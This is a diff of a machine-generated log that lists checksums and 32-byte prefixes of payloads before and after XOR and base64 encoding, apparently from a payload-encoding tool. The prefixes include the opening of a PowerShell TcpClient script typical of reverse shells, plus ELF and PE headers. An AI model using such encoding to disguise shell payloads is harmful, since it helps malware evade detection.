-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 18 log subnumber: 0
-035973fa7c2a69c3abd0bbb7777e0d9e 
- b'\x8b\xcc\xc3\xc6\xca\xc1\xdb\x8f\x92\x8f\xf4\xe1\xca\xdb\x81\xfc\xc0\xcc\xc4\xca\xdb\xdc\x81\xfb\xcc\xdf\xec\xc3\xc6\xca\xc1\xdb' 
+a000d021bad66a684bb2ef7c6c70859e 
+ b'(\x12\x1b\x11UVVWWWWWWWWWTWiWVWWW7FWWWWWW' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 18 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 18 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 18 log subnumber: 1
-899447f6fc049b6738b8c4e3fabebadc 
- b'\xe2\xf5?\xaf\xac\xaf\xaf\xaf\xab\xaf\xaf\xafPP\xaf\xaf\x17\xaf\xaf\xaf\xaf\xaf\xaf\xaf\xef\xaf\xaf\xaf\xaf\xaf\xaf\xaf' 
+3de2eb47db94be32f40d05093589ca96 
+ b'\x1a\r\xc7WTWWWSWWW\xa8\xa8WW\xefWWWWWWW\x17WWWWWWW' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 18 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 19 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 19 log subnumber: 0
-af07b8cc4bc4932cd0af6f969f28c936 
- b'I\x0e\x01\x04\x08\x03\x19MPM6#\x08\x19C>\x02\x0e\x06\x08\x19\x1eC9\x0e\x1d.\x01\x04\x08\x03\x19' 
+90a4e5485c437c20333e936bde0eb7fe 
+ b'\x89\xb3\xba\xb0\xf4\xf7\xf7\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf5\xf6\xc8\xf6\xf7\xf6\xf6\xf6\x96\xe7\xf6\xf6\xf6\xf6\xf6\xf6' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 19 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 19 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 19 log subnumber: 1
-5c52f660c95a57db4300758cc1ac4a34 
- b' 7\xfdmnmmmimmm\x92\x92mm\xd5mmmmmmm-mmmmmmm' 
+eb9e7cc63f1b0ec45dff4b2fa243f011 
+ b'\xbb\xacf\xf6\xf5\xf6\xf6\xf6\xf2\xf6\xf6\xf6\t\t\xf6\xf6N\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xb6\xf6\xf6\xf6\xf6\xf6\xf6\xf6' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 19 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 20 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 20 log subnumber: 0
-594eb02a8d4721ad6f441155a790165c 
- b'JGNsaWVudCA9IFtOZXQuU29ja2V0cy5U' 
+47c03856c3187fdab3a0f42e6aa9a903 
+ b'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 20 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 20 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
@@ -647,208 +647,208 @@ This is the checksum of what is preserved after applying base64 to the payload (
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 21 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 21 log subnumber: 0
-96cd2ad4a85660834726f653f552592d 
- b'T\x13\x1c\x19\x15\x1e\x04PMP+>\x15\x04^#\x1f\x13\x1b\x15\x04\x03^$\x13\x003\x1c\x19\x15\x1e\x04' 
+04a7fcd1a4c624183314b6adbc861229 
+ b'{AHB\x06\x05\x05\x04\x04\x04\x04\x04\x04\x04\x04\x04\x07\x04:\x04\x05\x04\x04\x04d\x15\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 21 log subnumber: 0
-3cb5cd3ab7b7ba4682412c65262debe8 
- b'VBMcGRUeBFBNUCs+FQReIx8TGxUEA14k' 
+f7c6b324db7bd5939209f33ba4c2bd49 
+ b'e0FIQgYFBQQEBAQEBAQEBAcEOgQFBAQE' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 21 log subnumber: 0
-96cd2ad4a85660834726f653f552592d 
- b'T\x13\x1c\x19\x15\x1e\x04PMP+>\x15\x04^#\x1f\x13\x1b\x15\x04\x03^$\x13\x003\x1c\x19\x15\x1e\x04' 
+04a7fcd1a4c624183314b6adbc861229 
+ b'{AHB\x06\x05\x05\x04\x04\x04\x04\x04\x04\x04\x04\x04\x07\x04:\x04\x05\x04\x04\x04d\x15\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 21 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 21 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 21 log subnumber: 1
-283e22cdba800fddcf68f86d50242525 
- b'=*\xe0psppptppp\x8f\x8fpp\xc8ppppppp0ppppppp' 
+8d385541460c98c0bd540532cc9f0fab 
+ b'I^\x94\x04\x07\x04\x04\x04\x00\x04\x04\x04\xfb\xfb\x04\x04\xbc\x04\x04\x04\x04\x04\x04\x04D\x04\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 21 log subnumber: 1
-581eb8d8cd58ba271da75a841a8b4d5f 
- b'PSrgcHNwcHB0cHBwj49wcMhwcHBwcHBw' 
+7f3489f743ec8ae9b5588151870827f6 
+ b'SV6UBAcEBAQABAQE+/sEBLwEBAQEBAQE' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 21 log subnumber: 1
-283e22cdba800fddcf68f86d50242525 
- b'=*\xe0psppptppp\x8f\x8fpp\xc8ppppppp0ppppppp' 
+8d385541460c98c0bd540532cc9f0fab 
+ b'I^\x94\x04\x07\x04\x04\x04\x00\x04\x04\x04\xfb\xfb\x04\x04\xbc\x04\x04\x04\x04\x04\x04\x04D\x04\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 21 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 22 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 22 log subnumber: 0
-116f75f38a19c23d64fba4fc02ac31b7 
- b'E\x02\r\x08\x04\x0f\x15A\\A:/\x04\x15O2\x0e\x02\n\x04\x15\x12O5\x02\x11"\r\x08\x04\x0f\x15' 
+760f57c3354abe28fee186397866fcc0 
+ b'\xb5\x8f\x86\x8c\xc8\xcb\xcb\xca\xca\xca\xca\xca\xca\xca\xca\xca\xc9\xca\xf4\xca\xcb\xca\xca\xca\xaa\xdb\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 22 log subnumber: 0
-05538c1967517583298aa26fb64559de 
- b'RQINCAQPFUFcQTovBBVPMg4CCgQVEk81' 
+dc1b33cf7b9bbafa0af7394ea6914aa6 
+ b'tY+GjMjLy8rKysrKysrKysnK9MrLysrK' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 22 log subnumber: 0
-116f75f38a19c23d64fba4fc02ac31b7 
- b'E\x02\r\x08\x04\x0f\x15A\\A:/\x04\x15O2\x0e\x02\n\x04\x15\x12O5\x02\x11"\r\x08\x04\x0f\x15' 
+760f57c3354abe28fee186397866fcc0 
+ b'\xb5\x8f\x86\x8c\xc8\xcb\xcb\xca\xca\xca\xca\xca\xca\xca\xca\xca\xc9\xca\xf4\xca\xcb\xca\xca\xca\xaa\xdb\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 22 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 22 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 22 log subnumber: 1
-63978c8054377ddbc0e2cc1bcdaa8986 
- b',;\xf1abaaaeaaa\x9e\x9eaa\xd9aaaaaaa!aaaaaaa' 
+eac2eb141772a78884950482c675ae6f 
+ b'\x87\x90Z\xca\xc9\xca\xca\xca\xce\xca\xca\xca55\xca\xcar\xca\xca\xca\xca\xca\xca\xca\x8a\xca\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 22 log subnumber: 1
-b8f09e42ccfa5ffcb736f479cccef7bb 
- b'LDvxYWJhYWFlYWFhnp5hYdlhYWFhYWFh' 
+0afbfb20204e0dcbdd82028448354613 
+ b'h5BaysnKysrOysrKNTXKynLKysrKysrK' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 22 log subnumber: 1
-63978c8054377ddbc0e2cc1bcdaa8986 
- b',;\xf1abaaaeaaa\x9e\x9eaa\xd9aaaaaaa!aaaaaaa' 
+eac2eb141772a78884950482c675ae6f 
+ b'\x87\x90Z\xca\xc9\xca\xca\xca\xce\xca\xca\xca55\xca\xcar\xca\xca\xca\xca\xca\xca\xca\x8a\xca\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 22 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 23 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 23 log subnumber: 0
-9b25be8ba06c45837e39541fc2678d10 
- b'\x12UZ_SXB\x16\x0b\x16mxSB\x18eYU]SBE\x18bUFuZ_SXB' 
+f3faccfca8e175ed8ab7d66f8beeee07 
+ b'\xf1\xcb\xc2\xc8\x8c\x8f\x8f\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8d\x8e\xb0\x8e\x8f\x8e\x8e\x8e\xee\x9f\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 23 log subnumber: 0
-02eba676446abd9764f44640c2c77527 
- b'ElVaX1NYQhYLFm14U0IYZVlVXVNCRRhi' 
+02218e080021c90fdb15ba26dc1b5dc5 
+ b'8cvCyIyPj46Ojo6Ojo6Ojo2OsI6Pjo6O' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 23 log subnumber: 0
-9b25be8ba06c45837e39541fc2678d10 
- b'\x12UZ_SXB\x16\x0b\x16mxSB\x18eYU]SBE\x18bUFuZ_SXB' 
+f3faccfca8e175ed8ab7d66f8beeee07 
+ b'\xf1\xcb\xc2\xc8\x8c\x8f\x8f\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8d\x8e\xb0\x8e\x8f\x8e\x8e\x8e\xee\x9f\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 23 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 23 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 23 log subnumber: 1
-ab6a474ec62fe11e4cf7fef850901a5c 
- b'{l\xa6656662666\xc9\xc966\x8e6666666v6666666' 
+b5266e24800da3d035f8bd97acae7686 
+ b'\xc3\xd4\x1e\x8e\x8d\x8e\x8e\x8e\x8a\x8e\x8e\x8eqq\x8e\x8e6\x8e\x8e\x8e\x8e\x8e\x8e\x8e\xce\x8e\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 23 log subnumber: 1
-6e9c905b1004025b4921d03ca3b3e6f3 
- b'e2ymNjU2NjYyNjY2yck2No42NjY2NjY2' 
+4b8196a2616d092b2289116d0ce79e5b 
+ b'w9Qejo2Ojo6Kjo6OcXGOjjaOjo6Ojo6O' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 23 log subnumber: 1
-ab6a474ec62fe11e4cf7fef850901a5c 
- b'{l\xa6656662666\xc9\xc966\x8e6666666v6666666' 
+b5266e24800da3d035f8bd97acae7686 
+ b'\xc3\xd4\x1e\x8e\x8d\x8e\x8e\x8e\x8a\x8e\x8e\x8eqq\x8e\x8e6\x8e\x8e\x8e\x8e\x8e\x8e\x8e\xce\x8e\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 23 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 24 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 24 log subnumber: 0
-27b28215d34b003e248cbde75d8334ab 
- b'[\x1c\x13\x16\x1a\x11\x0b_B_$1\x1a\x0bQ,\x10\x1c\x14\x1a\x0b\x0cQ+\x1c\x0f<\x13\x16\x1a\x11\x0b' 
+972cd9de04a5a66fb71a4bb2542d7336 
+ b'\x11+"(loonnnnnnnnnmnPnonnn\x0e\x7fnnnnnn' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 24 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 24 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 24 log subnumber: 1
-328fdaa3cbb470a35328551802d34f12 
- b'2%\xef\x7f|\x7f\x7f\x7f{\x7f\x7f\x7f\x80\x80\x7f\x7f\xc7\x7f\x7f\x7f\x7f\x7f\x7f\x7f?\x7f\x7f\x7f\x7f\x7f\x7f\x7f' 
+d49ca0be640fc241d2dc2b45835668cd 
+ b'#4\xfenmnnnjnnn\x91\x91nn\xd6nnnnnnn.nnnnnnn' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 24 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 25 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 25 log subnumber: 0
-035973fa7c2a69c3abd0bbb7777e0d9e 
- b'\x8b\xcc\xc3\xc6\xca\xc1\xdb\x8f\x92\x8f\xf4\xe1\xca\xdb\x81\xfc\xc0\xcc\xc4\xca\xdb\xdc\x81\xfb\xcc\xdf\xec\xc3\xc6\xca\xc1\xdb' 
+a000d021bad66a684bb2ef7c6c70859e 
+ b'(\x12\x1b\x11UVVWWWWWWWWWTWiWVWWW7FWWWWWW' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 25 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 25 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 25 log subnumber: 1
-899447f6fc049b6738b8c4e3fabebadc 
- b'\xe2\xf5?\xaf\xac\xaf\xaf\xaf\xab\xaf\xaf\xafPP\xaf\xaf\x17\xaf\xaf\xaf\xaf\xaf\xaf\xaf\xef\xaf\xaf\xaf\xaf\xaf\xaf\xaf' 
+3de2eb47db94be32f40d05093589ca96 
+ b'\x1a\r\xc7WTWWWSWWW\xa8\xa8WW\xefWWWWWWW\x17WWWWWWW' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 25 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 26 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 26 log subnumber: 0
-af07b8cc4bc4932cd0af6f969f28c936 
- b'I\x0e\x01\x04\x08\x03\x19MPM6#\x08\x19C>\x02\x0e\x06\x08\x19\x1eC9\x0e\x1d.\x01\x04\x08\x03\x19' 
+90a4e5485c437c20333e936bde0eb7fe 
+ b'\x89\xb3\xba\xb0\xf4\xf7\xf7\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf5\xf6\xc8\xf6\xf7\xf6\xf6\xf6\x96\xe7\xf6\xf6\xf6\xf6\xf6\xf6' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 26 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 26 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 26 log subnumber: 1
-5c52f660c95a57db4300758cc1ac4a34 
- b' 7\xfdmnmmmimmm\x92\x92mm\xd5mmmmmmm-mmmmmmm' 
+eb9e7cc63f1b0ec45dff4b2fa243f011 
+ b'\xbb\xacf\xf6\xf5\xf6\xf6\xf6\xf2\xf6\xf6\xf6\t\t\xf6\xf6N\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xb6\xf6\xf6\xf6\xf6\xf6\xf6\xf6' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 26 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 27 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 27 log subnumber: 0
-594eb02a8d4721ad6f441155a790165c 
- b'JGNsaWVudCA9IFtOZXQuU29ja2V0cy5U' 
+47c03856c3187fdab3a0f42e6aa9a903 
+ b'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 27 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 27 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
